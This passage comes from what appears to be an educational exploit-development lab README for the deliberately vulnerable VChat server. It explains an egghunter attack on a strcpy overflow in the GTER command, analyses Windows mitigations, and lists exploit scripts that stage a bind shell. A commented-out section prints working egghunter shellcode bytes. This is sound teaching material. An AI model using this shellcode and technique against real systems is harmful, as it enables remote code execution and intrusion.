|No Effect|Address Space Layout Randomization, SafeSEH, SEHOP, Heap Integrity Validation, and Control Flow Guard (CFG)|
|Partial Mitigation|*None*|
|Full Mitigation|Buffer Security Checks (GS) ***or*** Data Execution Prevention (DEP)|

* `Defense: Buffer Security Check (GS)`: This mitigation strategy proves effective against stack-based buffer overflows that overwrite the return address or arguments of a function. This is because the randomly generated security cookie is placed before the return address, and its integrity is validated before the return address is loaded into the `EIP` register. As the security cookie is placed before the return address, in order for us to overflow the return address, we would have to corrupt the security cookie, allowing us to detect the overflow.
* `Defense: Data Execution Prevention (DEP)`: This mitigation strategy proves effective against stack-based buffer overflows that attempt to **directly execute** shellcode that has been placed into the process's address space that is not part of the `.text` section as this would raise an exception. This means if we attempt to execute the egg hunter on the stack, an exception would be raised, and if the egg hunter were to find the shellcode and attempt to execute, an exception would be raised.
* `Defense: Address Space Layout Randomization (ASLR)`: This does not affect our exploit as we do not require the addresses of external libraries or the addresses of internal functions. The jumps that we perform as part of the exploit are *relative* and compute where the flow of execution is directed to based on the current location.
* `Defense: SafeSEH`: This does not affect our exploit as we do not leverage Structured Exception Handling.
* `Defense: SEHOP`: This does not affect our exploit as we do not leverage Structured Exception Handling.
* `Defense: Heap Integrity Validation`: This does not affect our exploit as we do not leverage the Windows Heap.
> [!NOTE]
> `Defense: Buffer Security Check (GS)`: If the application improperly initializes the global security cookie or contains additional vulnerabilities that can leak values on the stack, then this mitigation strategy can be bypassed.
>
> `Defense: Data Execution Prevention (DEP)`: If the attacker employs a [ROP Technique](https://github.com/DaintyJet/VChat_TRUN_ROP), then this defense can be bypassed.
 ### Combined Defenses: VChat Exploit
|Mitigation Level|Defense: Buffer Security Check (GS)|Defense: Data Execution Prevention (DEP)|Defense: Addreace Layout Randomization (ASLR) |Defense: SafeSEH| Defense: SEHOP | Defense: Heap Integrity Validation| Defense: Defense: Control Flow Guard (CFG)|
|-|-|-|-|-|-|-|-|
|Defense: Buffer Security Check (GS)|X|**Increased Security**: Combining two effective mitigations provides the benefits of both.|**Increased Security**: ASLR increases the randomness of the generated security cookie.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The Windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | | |
|Defense: Data Execution Prevention (DEP)|**Increased Security**: Combining two effective mitigations provides the benefits of both.|X| **Partial Increase**: The randomization of addresses does not directly affect the protections provided by DEP. However, it does make it harder to bypass the protections of DEP with ROP Chains.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The SEH feature is not exploited.|**No Increase**: The windows Heap is not exploited.|**No Increase**: Indirect Calls/Jumps are not exploited. | |

> [!NOTE]
> We omit repetitive rows representing ineffective mitigation strategies as their cases are already covered.
## (Optional) VChat Code
### TRUN
Please refer to the [TRUN exploit](https://github.com/DaintyJet/VChat_TURN) for an explanation as to how and why the TURN overflow exploits VChat's code. The following discussion on the ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` function and the ```TRUN``` case will be on how we bypassed the zeroing of ```TurnBuf``` and the freeing of ```RecvBuf``` in addition to why it was done the way we did it.

Most exploitations of the original [Vulnserver](https://github.com/stephenbradshaw/vulnserver) use the fact it contains memory leaks to perform the EggHunter attack. That is, the ```RecvBuff``` is allocated on the heap in the following manner:

	```c
	char *RecvBuf = malloc(DEFAULT_BUFLEN);
	```

However there is no call to the function ```free()`` in the original [Vulnserver](https://github.com/stephenbradshaw/vulnserver) at any point against the *RecvBuf* allocated. This causes a memory leak where the malicious shellcode or data is injected into the heap, and even after the handling thread exits the Shellcode remains on the heap for the EggHunter to find.


In stark contrast to Vulnserver, VChat contains the following code snippet at the end of the ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` function:

	```c
	closesocket(Client);
	free(RecvBuf);
	free(GdogBuf);
	```

This means our shellcode is de-allocated when the function ends, and since this is a thread, our shellcode gets overwritten or removed before we can find it with the EggHunter. In this case, it was decided that we would exploit the **TRUN** command since it has a buffer large enough for the bind shellcode, and to prevent the memory from being zeroed or deallocated, we would introduce an infinite loop into the buffer overflow. This prevents the program from freeing the allocated memory without crashing the program. However, this will make the program use up most, if not all, of your CPU! 
> It of course would be more efficient to simply execute the shellcode in the **TRUN** command but that defeats the purpose of this exercise!

### GTER

The **GTER** case in the ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` function has the following structure:

```c
char* GterBuf = malloc(180);
memset(GdogBuf, 0, 1024);
strncpy(GterBuf, RecvBuf, 180);
memset(RecvBuf, 0, DEFAULT_BUFLEN);
Function1(GterBuf);
SendResult = send(Client, "GTER ON TRACK\n", 14, 0);
```

1. It declares the ```GterBuf``` buffer and allocates space for 180 bytes (characters).
2. It zeros the ```GdogBuf``` which is not used in this function.
3. It copies over 180 characters from the ```RecvBuff``` into the ```GterBuf```.
4. It zeros out the ```RecvBuff```, in the original Vulnserver this prevents us from using **GTER** to both stage the bind shell's shellcode and inject the EggHunter.
5. It calls Function1 with the GterBuf.

The Overflow occurs in ```Function1(char*)```:

```c
void Function1(char *Input) {
	char Buffer2S[140];
	strcpy(Buffer2S, Input);
}
```
1. We declare a local buffer ```Buffer2S``` who's space for 140 characters is allocated on the *stack*.
2. We copy ```Input```, which in this case can hold up to 180 characters into ```Buffer2S```.

Our ability to modify the program's execution is because the C [standard library function](https://man7.org/linux/man-pages/man3/strcpy.3.html) ```strcpy(char* dst, char* src)``` is used to copy the passed parameter *Input* (i.e. KnocBuf) into a local buffer ```Buffer2S[140]```. Unlike the C [standard library function](https://cplusplus.com/reference/cstring/strncpy/) ```strncpy(char*,char*,size_t)``` used in the ```ConnectionHandler(LPVOID CSocket)``` which copies only a specified number of characters to the destination buffer. The ```strcpy(char* dst, char* src)``` function does not preform any **bound checks** when copying data from the **source** to **destination** buffer, it will stop copying once every byte up to and including a **null terminator** (`\0`) from the **source** buffer has been copied contiguously to the **destination** buffer. This allows overflows to occur since we can as is done in ```Function1(char*)``` copy a larger string into an array that does not have the space for it. As ```Buffer2S``` is allocated on the stack, when we overflow it, we are able to modify the contents of the stack, which includes the return address for the function.

<!-- ##### End Planning
However, the "egghunter code" provided in the tutorial cannot work in Windows 10.
```
$ msf-egghunter -e w00t -f python -v EGGHUNTER
EGGHUNTER =  b""
EGGHUNTER += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd"
EGGHUNTER += b"\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74"
EGGHUNTER += b"\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
```

The following screenshot shows an exception is generated when executing the instruction *INT 2E* (a software interrupt for entering the kernel mode, like *syscalls*) from the above egghunter code. The program is finally terminated with exit code C0000005. More details about the issue of using *INT 2E* in Win64 system can be found [here](https://www.corelan.be/index.php/2011/11/18/wow64-egghunter/).

![egg issue 1](Images/egg1.png)
![egg issue 2](Images/egg2.png)

The above egghunter code cannot be used in Windows 10, so I generated a compatible egghunter following this [video tutorial](https://www.youtube.com/watch?v=E82IydovVf4) (start from 17:15).

## Solutions
In short, there are two things that are not mentioned in the original blog and you have to do to make the exploitation work in a Windows 10 machine:  

- **First**, Generating the compatible egghunter code by using mona in the debugger
```
!mona egg -t w00t -wow64 win10
```

The generated code is as follows:
```
EGGHUNTER += b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
EGGHUNTER += b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
EGGHUNTER += b"\x05\x74\xdf\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
EGGHUNTER += b"\xff\xe7"
```

- **Second**, ignore all exceptions in the debugger. This can be set in the debugger: Options -> Debugging options -> Exceptions, and select all exceptions.

 -->

## Test code
1. [exploit0.py](SourceCode/exploit1.py): Sends a reproduction of the fuzzed message that crashed the server.
2. [exploit1.py](SourceCode/exploit1.py): Sends a cyclic pattern of chars to identify the offset used to modify the memory at the address we need to inject to control EIP.
3. [exploit2.py](SourceCode/exploit2.py): Replacing the bytes at the offset discovered by exploit1.py with the address of a different value (`B`) so we can ensure the offset we discovered is correct.
4. [exploit3.py](SourceCode/exploit3.py): Replacing the bytes at the offset discovered by exploit1.py with the address of a `jmp esp` instruction. This is used to modify the control flow, and test that our address for `jmp esp` is correct.
3. [exploit4.py](SourceCode/exploit4.py): Adding a instruction allowing us to jump to the start of the buffer. 
4. [exploit5.py](SourceCode/exploit5.py): Adding egghunter shellcode to the payload and adding a separate bind shell payload to the exploit.

## References
[[1]  Safely Searching Process Virtual Address Space](https://www.hick.org/code/skape/papers/egghunt-shellcode.pdf)

[[2] The Basics of Exploit Development 3: Egg Hunters](https://www.coalfire.com/the-coalfire-blog/the-basics-of-exploit-development-3-egg-hunters#:~:text=Generally%2C%20an%20Egg%20Hunter%20is,one%20directly%20follows%20the%20other) <!-- May be used for Egg Hunting Hyper Link -->

[[3] A closer look to msf-egghunter](https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/)

[[4] Using the Egghunter Mixin](https://www.offsec.com/metasploit-unleashed/egghunter-mixin/)

[[5] x86_64 - can a 64-bit application on windows execute INT 2E instead of syscall?](https://stackoverflow.com/questions/70028273/x86-64-can-a-64-bit-application-on-windows-execute-int-2e-instead-of-syscall)

[[6] Virtual Secure Mode](https://learn.microsoft.com/en-us/virtualization/hyper-v-on-windows/tlfs/vsm)
